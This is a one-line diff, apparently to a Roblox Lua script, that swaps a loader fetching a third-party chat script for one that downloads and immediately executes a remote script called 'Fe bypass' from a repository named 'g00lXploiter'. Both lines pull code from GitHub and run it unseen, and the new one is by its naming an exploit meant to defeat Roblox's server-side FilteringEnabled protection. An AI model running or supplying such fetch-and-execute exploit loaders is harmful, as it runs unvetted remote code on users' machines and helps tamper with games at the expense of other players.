@@ -1,1 +1,1 @@
-loadstring(game:HttpGet('https://raw.githubusercontent.com/YTeber112/Incognitochat/main/IncognitoChatV2_77.lua',true))():Load("Created by YTeber112")
+loadstring(game:HttpGet("https://raw.githubusercontent.com/g00lXploiter/g00lXploiter/main/Fe%20bypass", true))()
